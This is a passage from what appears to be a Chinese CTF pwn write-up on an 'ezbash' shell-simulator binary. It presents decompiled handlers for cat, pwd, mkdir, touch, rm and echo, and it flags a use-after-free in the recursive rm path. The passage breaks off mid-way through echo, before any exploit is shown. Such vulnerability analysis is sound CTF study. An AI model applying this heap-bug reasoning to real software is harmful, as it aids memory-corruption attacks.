class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v1; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"type\">void</span> *v2; <span class=\"comment\">// rsp</span></span><br><span class=\"line\">  _BYTE v4[<span class=\"number\">8</span>]; <span class=\"comment\">// [rsp+8h] [rbp-70h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">char</span> **comment; <span class=\"comment\">// [rsp+10h] [rbp-68h]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> v6; <span class=\"comment\">// [rsp+1Fh] [rbp-59h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v7; <span class=\"comment\">// [rsp+20h] [rbp-58h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> num; <span class=\"comment\">// [rsp+24h] [rbp-54h]</span></span><br><span class=\"line\">  file *v9; <span class=\"comment\">// [rsp+28h] [rbp-50h]</span></span><br><span class=\"line\">  __int64 v10; <span class=\"comment\">// [rsp+30h] [rbp-48h]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> *dest; <span class=\"comment\">// [rsp+38h] [rbp-40h]</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v12; <span class=\"comment\">// [rsp+40h] [rbp-38h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  comment = cmd;</span><br><span class=\"line\">  v12 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  num = <span class=\"number\">0</span>;                                      <span class=\"comment\">// 参数的数目</span></span><br><span class=\"line\">  v6 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7 = <span class=\"number\">0</span>;                                       <span class=\"comment\">// v7 最大参数的长度</span></span><br><span class=\"line\">  v9 = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( comment[++num] )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( <span class=\"built_in\">strlen</span>(comment[num]) &gt; v7 )</span><br><span class=\"line\">      v7 = <span class=\"built_in\">strlen</span>(comment[num]) + <span class=\"number\">1</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  v10 = v7 - <span class=\"number\">1LL</span>;</span><br><span class=\"line\">  v1 = <span class=\"number\">16</span> * ((v7 + <span class=\"number\">15LL</span>) / <span class=\"number\">0x10</span>uLL);</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( v4 != &amp;v4[-(v1 &amp; <span class=\"number\">0xFFFFFFFFFFFFF000</span>LL)] )</span><br><span class=\"line\">    ;</span><br><span class=\"line\">  v2 = alloca(v1 &amp; <span class=\"number\">0xFFF</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (v1 &amp; <span class=\"number\">0xFFF</span>) != <span class=\"number\">0</span> )</span><br><span class=\"line\">    *&amp;v4[(v1 &amp; <span class=\"number\">0xFFF</span>) - <span class=\"number\">8</span>] = *&amp;v4[(v1 &amp; <span class=\"number\">0xFFF</span>) - <span class=\"number\">8</span>];</span><br><span class=\"line\">  dest = v4;</span><br><span class=\"line\">  num = <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !comment[<span class=\"number\">1</span>] )</span><br><span class=\"line\">    fwrite(<span class=\"string\">&quot;ezbash: missing operand\\n&quot;</span>, <span class=\"number\">1uLL</span>, <span class=\"number\">0x18</span>uLL, <span class=\"built_in\">stderr</span>);</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( comment[num] )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v9 = cuurr_pos-&gt;firstson;</span><br><span class=\"line\">    <span class=\"built_in\">strcpy</span>(dest, comment[num]);</span><br><span class=\"line\">    <span class=\"keyword\">while</span> ( v9 )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( !<span class=\"built_in\">strcmp</span>(dest, v9-&gt;name) )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( v9-&gt;context )</span><br><span class=\"line\">          <span class=\"built_in\">puts</span>(v9-&gt;context);</span><br><span class=\"line\">        v6 = <span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      v9 = v9-&gt;next_bro;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v6 != <span class=\"number\">1</span> )</span><br><span class=\"line\">      <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;ezbash: %s: No such file or directory\\n&quot;</span>, comment[num]);</span><br><span class=\"line\">    ++num;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">1LL</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"pwd\"><a class=\"markdownIt-Anchor\" href=\"#pwd\">#</a> pwd</h4>\n<p>仅仅只是输出当前的路径</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 <span class=\"title function_\">apwd</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(cur_position_addr);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">1LL</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"exithelp\"><a class=\"markdownIt-Anchor\" href=\"#exithelp\">#</a> exit,help</h4>\n<p>没什么可以说的。</p>\n<h4 id=\"mkdir\"><a class=\"markdownIt-Anchor\" href=\"#mkdir\">#</a> mkdir</h4>\n<p>在当前的目录下创建一个字目录，并把她 link 进 firstson 的链表，采用的是头插法。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">amkdir</span><span class=\"params\">(<span class=\"type\">char</span> **cmd)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> v1; <span class=\"comment\">// al</span></span><br><span class=\"line\">  <span class=\"type\">char</span> v3[<span class=\"number\">2</span>]; <span class=\"comment\">// [rsp+1Ah] [rbp-16h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v4; <span class=\"comment\">// [rsp+1Ch] [rbp-14h]</span></span><br><span class=\"line\">  file *first_son; <span class=\"comment\">// [rsp+20h] [rbp-10h]</span></span><br><span class=\"line\">  file *newfile; <span class=\"comment\">// [rsp+28h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v4 = <span class=\"number\">1</span>;</span><br><span class=\"line\">  qmemcpy(v3, <span class=\"string\">&quot;./&quot;</span>, <span class=\"keyword\">sizeof</span>(v3));</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !cmd[<span class=\"number\">1</span>] )</span><br><span class=\"line\">    fwrite(<span class=\"string\">&quot;ezbash: missing operand\\n&quot;</span>, <span class=\"number\">1uLL</span>, <span class=\"number\">0x18</span>uLL, <span class=\"built_in\">stderr</span>);</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( cmd[v4] )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    first_son = cuurr_pos-&gt;firstson;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( <span class=\"built_in\">strchr</span>(cmd[v4], v3[<span class=\"number\">0</span>]) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      ++v4;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ( <span class=\"built_in\">strchr</span>(cmd[v4], v3[<span class=\"number\">1</span>]) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      ++v4;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      ((&amp;check_error + <span class=\"number\">1</span>))();</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( v1 != <span class=\"number\">1</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, aEzbashCannotCr, cmd[v4++]);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">else</span></span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        newfile = calloc40();</span><br><span class=\"line\">        newfile-&gt;flag = <span class=\"number\">0</span>;</span><br><span class=\"line\">        newfile-&gt;futher = cuurr_pos;</span><br><span class=\"line\">        copy_name(newfile, cmd[v4]);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( cuurr_pos-&gt;firstson )</span><br><span class=\"line\">          link(first_son, newfile);</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">          cuurr_pos-&gt;firstson = newfile;</span><br><span class=\"line\">        ++v4;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">1LL</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"touch\"><a class=\"markdownIt-Anchor\" href=\"#touch\">#</a> touch</h4>\n<p>创建一个空文件，与 mkdir 的操作类似</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">atouch</span><span class=\"params\">(<span class=\"type\">char</span> **cmd)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> v1; <span class=\"comment\">// al</span></span><br><span class=\"line\">  <span class=\"type\">char</span> v3[<span class=\"number\">2</span>]; <span class=\"comment\">// [rsp+1Ah] [rbp-16h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v4; <span class=\"comment\">// [rsp+1Ch] [rbp-14h]</span></span><br><span class=\"line\">  file *v5; <span class=\"comment\">// [rsp+20h] [rbp-10h]</span></span><br><span class=\"line\">  file *v6; <span class=\"comment\">// [rsp+28h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v4 = <span class=\"number\">1</span>;</span><br><span class=\"line\">  qmemcpy(v3, <span class=\"string\">&quot;./&quot;</span>, <span class=\"keyword\">sizeof</span>(v3));</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !cmd[<span class=\"number\">1</span>] )</span><br><span class=\"line\">    fwrite(<span class=\"string\">&quot;ezbash: missing operand\\n&quot;</span>, <span class=\"number\">1uLL</span>, <span class=\"number\">0x18</span>uLL, <span class=\"built_in\">stderr</span>);</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( cmd[v4] )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( <span class=\"built_in\">strchr</span>(cmd[v4], v3[<span class=\"number\">0</span>]) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      ++v4;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ( <span class=\"built_in\">strchr</span>(cmd[v4], v3[<span class=\"number\">1</span>]) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      ++v4;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v5 = cuurr_pos-&gt;firstson;</span><br><span class=\"line\">      ((&amp;check_error + <span class=\"number\">1</span>))();</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( v1 != <span class=\"number\">1</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        ++v4;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">else</span></span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        v6 = calloc40();</span><br><span class=\"line\">        v6-&gt;flag = <span class=\"number\">1</span>;</span><br><span class=\"line\">        copy_name(v6, cmd[v4]);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( cuurr_pos-&gt;firstson )</span><br><span class=\"line\">          link(v5, v6);</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">          cuurr_pos-&gt;firstson = v6;</span><br><span class=\"line\">        ++v4;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">1LL</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>mkdir 与 touch 创建新的 file 的时候，调用 calloc40，这个其实就是模拟了 calloc</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">file *<span class=\"title function_\">malloc40</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  file *v1; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v1 = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x40</span>uLL);</span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(v1-&gt;name, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(v1-&gt;name));</span><br><span class=\"line\">  v1-&gt;context = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  v1-&gt;firstson = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  v1-&gt;next_bro = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  v1-&gt;prev_bro = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  v1-&gt;futher = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> v1;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">file *__fastcall <span class=\"title function_\">link</span><span class=\"params\">(file *curr, file *aim)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  file *result; <span class=\"comment\">// rax</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( curr-&gt;next_bro )</span><br><span class=\"line\">    curr = curr-&gt;next_bro;</span><br><span class=\"line\">  curr-&gt;next_bro = aim;</span><br><span class=\"line\">  result = aim;</span><br><span class=\"line\">  aim-&gt;prev_bro = curr;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这也导致了，后面泄露地址有点困难。两个命令支持在当前目录下一次创建多个对象</p>\n<h4 id=\"rm\"><a class=\"markdownIt-Anchor\" href=\"#rm\">#</a> rm</h4>\n<p>rm 可以进行两种操作，直接删除文件，或者 - r 参数删除文件夹，但是都只是当前目录下的对象。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">arm</span><span class=\"params\">(<span class=\"type\">char</span> **cmd)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> v2; <span class=\"comment\">// [rsp+1Bh] [rbp-15h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v3; <span class=\"comment\">// [rsp+1Ch] [rbp-14h]</span></span><br><span class=\"line\">  file *file; <span class=\"comment\">// [rsp+20h] [rbp-10h]</span></span><br><span class=\"line\">  file *ptr; <span class=\"comment\">// [rsp+28h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v3 = <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !cmd[<span class=\"number\">1</span>] )</span><br><span class=\"line\">    fwrite(<span class=\"string\">&quot;ezbash: missing operand\\n&quot;</span>, <span class=\"number\">1uLL</span>, <span class=\"number\">0x18</span>uLL, <span class=\"built_in\">stderr</span>);</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( cmd[v3] )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    file = cuurr_pos-&gt;firstson;</span><br><span class=\"line\">    v2 = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !<span class=\"built_in\">strcmp</span>(cmd[v3], <span class=\"string\">&quot;-r&quot;</span>) )               <span class=\"comment\">// -r</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( cmd[++v3] )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> ( file )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"keyword\">if</span> ( !<span class=\"built_in\">strcmp</span>(file-&gt;name, cmd[v3]) )</span><br><span class=\"line\">          &#123;</span><br><span class=\"line\">            v2 = <span class=\"number\">1</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ( !checkfolder(file) )</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;ezbash -r: cannot remove &#x27;%s&#x27;: Is a file\\n&quot;</span>, cmd[v3]);</span><br><span class=\"line\">              <span class=\"keyword\">goto</span> LABEL_26;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"built_in\">memset</span>(file-&gt;name, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(file-&gt;name));</span><br><span class=\"line\">            file-&gt;futher = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ( file-&gt;firstson )</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              ptr = file-&gt;firstson;</span><br><span class=\"line\">              <span class=\"keyword\">do</span></span><br><span class=\"line\">              &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> ( ptr-&gt;context )</span><br><span class=\"line\">                  <span class=\"built_in\">free</span>(ptr-&gt;context);</span><br><span class=\"line\">                <span class=\"built_in\">free</span>(ptr);                      <span class=\"comment\">// uaf</span></span><br><span class=\"line\">                                                <span class=\"comment\">// </span></span><br><span class=\"line\">                ptr = ptr-&gt;next_bro;</span><br><span class=\"line\">              &#125;</span><br><span class=\"line\">              <span class=\"keyword\">while</span> ( ptr );</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">goto</span> LABEL_14;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">          file = file-&gt;next_bro;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> LABEL_26;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      ++v3;</span><br><span class=\"line\">    &#125;                                           <span class=\"comment\">// 删除单文件</span></span><br><span class=\"line\">                                                <span class=\"comment\">// </span></span><br><span class=\"line\">                                                <span class=\"comment\">// </span></span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">while</span> ( file )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( !<span class=\"built_in\">strcmp</span>(file-&gt;name, cmd[v3]) )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          v2 = <span class=\"number\">1</span>;</span><br><span class=\"line\">          <span class=\"keyword\">if</span> ( checkfile(file) )</span><br><span class=\"line\">          &#123;</span><br><span class=\"line\">            <span class=\"built_in\">memset</span>(file-&gt;name, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(file-&gt;name));</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ( file-&gt;context )</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              <span class=\"built_in\">free</span>(file-&gt;context);</span><br><span class=\"line\">              file-&gt;context = <span class=\"number\">0LL</span>;              <span class=\"comment\">// 没有uaf</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">LABEL_14:</span><br><span class=\"line\">            unlink(file);</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">          <span class=\"keyword\">else</span></span><br><span class=\"line\">          &#123;</span><br><span class=\"line\">            <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;ezbash: &#x27;%s&#x27;: Is a directory\\n&quot;</span>, cmd[v3]);</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">          <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        file = file-&gt;next_bro;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">LABEL_26:</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( v2 != <span class=\"number\">1</span> )</span><br><span class=\"line\">        <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;ezbash: &#x27;%s&#x27;: No such file or directory\\n&quot;</span>, cmd[v3]);</span><br><span class=\"line\">      ++v3;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">  <span class=\"type\">void</span> __fastcall <span class=\"title function_\">unlink</span><span class=\"params\">(file *a1)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( a1-&gt;next_bro )</span><br><span class=\"line\">    a1-&gt;next_bro-&gt;prev_bro = a1-&gt;prev_bro;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( a1-&gt;prev_bro )</span><br><span class=\"line\">    a1-&gt;prev_bro-&gt;next_bro = a1-&gt;next_bro;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    cuurr_pos-&gt;firstson = a1-&gt;next_bro;</span><br><span class=\"line\">  a1-&gt;next_bro = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  a1-&gt;prev_bro = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"built_in\">free</span>(a1);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">    </span><br></pre></td></tr></table></figure>\n<p>只可以堆当前目录的对象进行操作。当删除的目录下有子目录 x，不会破坏 x 的子文件链表结构，这里看似存在 uaf 名单时册灰姑娘徐每次创建 file 都会清空，所以无法利用。checkfile 以及 checkfolder 分别检查对象是文件还是文件夹。-r 不可删除文件。unlink 的操作也没有什么问题，</p>\n<h4 id=\"echo\"><a class=\"markdownIt-Anchor\" href=\"#echo\">#</a> echo</h4>\n<p>echo 支持两种操作，一个是将内容直接输出，一个是根据倒数第二个参数是否为 “-&gt;” 决定，不是，就直接输出，否则，就会将数据写进指定的 file。强调，一定是倒数第二参数。其他一律认为是内容，字符串不存在空格，是写进 context 的时候额外加入的。另外，echo 不可以将空字符写入。而且也不会在</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span 